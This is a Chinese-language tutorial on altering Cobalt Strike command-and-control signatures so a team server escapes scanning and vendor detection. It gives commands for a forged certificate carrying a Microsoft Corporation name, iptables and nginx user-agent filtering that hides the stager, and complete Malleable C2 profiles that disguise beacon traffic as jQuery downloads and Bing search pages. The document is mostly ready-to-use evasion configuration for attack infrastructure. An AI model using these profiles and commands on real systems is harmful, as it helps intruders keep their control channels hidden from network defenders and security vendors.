# cobaltstrike特征修改

Cobalt Strike是一款内网渗透测试工具，常被业界人称为CS。Cobalt Strike
2.0版本主要是结合Metasploit可以称为图形化MSF工具。而Cobalt Strike
3.0已经不再使用Metasploit框架而作为一个独立的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。客户端模式和服务端模式可以在Windows以及Linux上运行这里要注意服务端模式在Windows下运行时有可能会出现一些细小的问题不过影响不大。可以很好的解决metasploit对Windows支持不够好的问题。

Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win
dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。

用的人多，厂商也是对其严防死守，所以简单综合下网上资料来修改自己的cs以躲避检查。

## 端口

客户端默认连接端口：50050  
修改方式：直接编辑teamserver端口![image.png](https://image.3001.net/images/20220823/1661269297_6304f53164e2f1d42bbd0.png!small)image.png

## 证书

### cobaltstrike证书

 **客户端连接时使用，存在特征。**  
默认证书特征：  
sha256值

![image.png](https://image.3001.net/images/20220823/1661269298_6304f532032e98516d9d3.png!small)image.png

keytool查看证书内容

    
    
    keytool -list -v -keystore cobaltstrike.store -storepass 123456

![image.png](https://image.3001.net/images/20220823/1661269298_6304f532ae98bfb7162f6.png!small)image.png

censys.io查询其sha256值

![image.png](https://image.3001.net/images/20220823/1661269299_6304f53366220dbc5f47a.png!small)image.png

修改：使用keytool重新生成证书， **此证书不具有可信度，只是无特征而已**

    
    
    keytool -keystore cobaltstrike.store -storepass zyd123456 -keypass zyd123456 -genkey -keyalg RSA -alias baidu.com -dname "CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US"  
    keytool -importkeystore -srckeystore cobaltstrike.store -destkeystore cobaltstrike.store -deststoretype pkcs12

修改过后的证书

![image.png](https://image.3001.net/images/20220823/1661269300_6304f5340044bfd036a31.png!small)image.pngcensys.io已经无法查到![image.png](https://image.3001.net/images/20220823/1661269300_6304f534a513bea23a4c9.png!small)image.png

### https证书

 **使用https监听器时使用，默认的证书存在特征，最好使用有效证书其次选择自签名证书。**  
购买域名后去freessl申请受信任的证书

![image.png](https://image.3001.net/images/20220823/1661269301_6304f5353268014320bd1.png!small)image.png

将生成pem文件和key文件上传到vps，并重新生成store文件

    
    
    openssl pkcs12 -export -in full_chain.pem -inkey private.key -out cdn.zhang1d.xyz.p12 -name cdn.zhany1d.xyz -passout pass:zyd123456  
      
    keytool -importkeystore -deststorepass zyd123456 -destkeypass zyd123456 -destkeystore new.store -srckeystore cdn.zhang1d.xyz.p12 -srcstoretype PKCS12 -srcstorepass zyd123456 -alias cdn.zhangy1d.xyz

修改Malleable-C2-Profiles文件，指定https-certificate为new.store

    
    
    https-certificate {  
    set keystore "new.store";  
    set password "zyd123456";  
    }

![image.png](https://image.3001.net/images/20220823/1661269301_6304f535d49d55e847055.png!small)image.png

## Beacon Staging特征

源自于cobalt
strike使用stageless过程即客户端使用小巧的stager后续在向其投放shellcode建立beacon，而服务端获取shellcode的uri可被探测即所有访问监听器端口可以获取shellcode而cs使用默认的密钥混淆shellcode，当脚本请求到shellcode之后可以解密获取shellcode特征导致server被识别。

使用nmap脚本可扫描出C2信息

    
    
    nmap 192.168.163.142 -p 8180 --script=./grab_beacon_config.nse

![image.png](https://image.3001.net/images/20220823/1661269302_6304f5365b14738688adb.png!small)image.png

#### 方法一

iptables限制listenner端口只允许本地访问

    
    
    iptables -I INPUT -p tcp --dport 8180 -j DROP   
    iptables -I INPUT -s 127.0.0.1 -ptcp --dport 8180 -j ACCEPT

使用nginx代理设置特定user-agent请求转发至listener监听端口以躲避扫描

    
    
    location ~*/jquery {  
    if ($http_user_agent != "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko") {  
    return 302 $REDIRECT_DOMAIN$request_uri;  
    }  
    proxy_pass          https://127.0.0.1:8180;

#### 方法二

Malleable-C2-Profiles文件自定义http-stager uri

    
    
    ### HTTP-stager :staging process  
    set host_stage "true";  
      
    http-stager{  
      
    set uri_x86 "/jquery-3.3.1.slim.min.js";  
    set uri_x64 "/jquery-3.3.2.slim.min.js";  
      
      
    client{  
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";  
    header "Accept-Language" "en-US,en;q=0.5";  
    #header "Host" "code.jquery.com";  
    header "Referer" "http://www.baidu.com/";  
    header "Accept-Encoding" "gzip, deflate";  
    }  
      
    server {  
    header "Server" "Microsoft-IIS/10.0";  
    header "Cache-Control" "max-age=0, no-cache";  
    header "Pragma" "no-cache";  
    header "Connection" "keep-alive";  
    header "Content-Type" "application/javascript; charset=utf-8";  
    output {  
    ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)  
    # 2nd Line              
    prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";  
    # 1st Line  
    prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";  
    append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";  
    print;  
    }  
    }  
      
    }

## 流量特征

默认的CobaltStrike流量特征明显，使用Malleable-C2-Profiles 配置文件可自定义修改流量特征绕过检查。

其基本语法学习可参考：Malleable C2

改写后的Malleable-C2-Profile如下：

    
    
    ### sleep jitter  
    set sleeptime "30000";  
    set jitter "45";  
      
      
    set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)";  
      
    ### self-sigend Certificate https:自签名证书  
      
    https-certificate {  
    set C "CN";  
    set CN "zhangyida";  
    set L "CN";  
    set O "CN";  
    set OU "baidu.com";  
    set validity "365";  
    }  
      
      
    ### Valid SSL Certificate HTTPS：有效证书  
    #https-certificate{  
    # set keystore "new.store";  
    # set password "ccc123456";  
    #}  
      
    ### http/s global response header  
    http-config{  
    set headers " Server,Content-Type,Cache-Control,Connection,X-Powered-By";  
    header "Sever" "Microsoft-IIS/10.0";  
    header "Content-Type" "text/html;charset=UTF-8";  
    header "Cache-Control" "max-age=1";  
    header "Connection" "keep-alive";  
    header "X-Powered-By" "ASP.net";  
    set trust_x_forwarded_for "false";  #重定向设置  
    }  
      
      
      
      
      
      
    # http-get  
    http-get {  
      
    set uri "/jquery_2.4.0/5eN1bjq8AAUYm2zgoY3K/ll_9354efa.js";  
      
    client {  
      
    header "Host" "www.baidu.com";  
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";  
    header "Cookie" "DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG";   
      
    metadata {  
    base64url;  
    parameter "q";  
    }  
      
    parameter "go" "Search";  
    parameter "qs" "bs";  
    parameter "form" "QBRE";  
      
      
    }  
      
    server {  
      
    header "Cache-Control" "private, max-age=0";  
    header "Content-Type" "text/html; charset=utf-8";  
    header "Vary" "Accept-Encoding";  
    header "Connection" "close";  
      
      
    output {  
    netbios;  
    prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&ampampq=canary&ampampgo=Search&ampampqs=bs&ampampform=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&ampampq=canary&ampampgo=Search&ampampqs=bs&ampampform=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";  
    append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";  
    print;  
    }  
    }  
    }  
      
      
    # http-post  
    http-post{  
      
    set uri "/hiscd37ed75a9387c5b.js";  
      
    #   set verb "GET";  
      
    client {  
    header "Accept" "*/*";  
    header "Host" "www.baidu.com";  
    header "Content-Type" "text/html;charset=UTF-8";  
    header "Cache-Control" "max-age=1";  
      
    id {  
    base64url;  
    parameter "form";  
    }  
    output {  
    base64;  
    print;  
    }  
    }  
      
    server{  
    header "Cache-Control" "private,max-age=0";  
    header "Content-Type" "text/html;charset=UTF-8";  
    header "Vary" "Accept-Encoding";  
    header "Server" "Microsoft-IIS/10";  
    header "Connection" "close";  
      
    output{  
    netbios;  
    prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&ampampq=canary&ampampgo=Search&ampampqs=bs&ampampform=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&ampampq=canary&ampampgo=Search&ampampqs=bs&ampampform=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";  
    append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";  
    print;    
    }  
      
    }  
      
    }  
      
      
    ### HTTP-stager :staging process  
    set host_stage "true";  
      
    http-stager{  
      
    set uri_x86 "/jquery-3.3.1.slim.min.js";  
    set uri_x64 "/jquery-3.3.2.slim.min.js";  
      
      
    client{  
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";  
    header "Accept-Language" "en-US,en;q=0.5";  
    #header "Host" "code.jquery.com";  
    header "Referer" "http://www.baidu.com/";  
    header "Accept-Encoding" "gzip, deflate";  
    }  
      
    server {  
    header "Server" "Microsoft-IIS/10.0";  
    header "Cache-Control" "max-age=0, no-cache";  
    header "Pragma" "no-cache";  
    header "Connection" "keep-alive";  
    header "Content-Type" "application/javascript; charset=utf-8";  
    output {  
    ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)  
    # 2nd Line              
    prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";  
    # 1st Line  
    prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";  
    append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";  
    print;  
    }  
    }  
      
      
    }

使用c2lint检查无报错即可使用

![image.png](https://image.3001.net/images/20220823/1661269303_6304f53726ea834259305.png!small)image.png

## 后续

以上基本都是根据前人的经验做的修改，没什么创新且熟悉Malleable C2语法修改起来会更加得心应手。

后续还需要做的是隐藏C2 Server的真实IP。

## 参考

csroad大佬的cs特征修改与隐藏

Cobalt Strike特征隐藏

大佬总结的cobaltstrike学习wiki

一些malleable-c2-profile模板

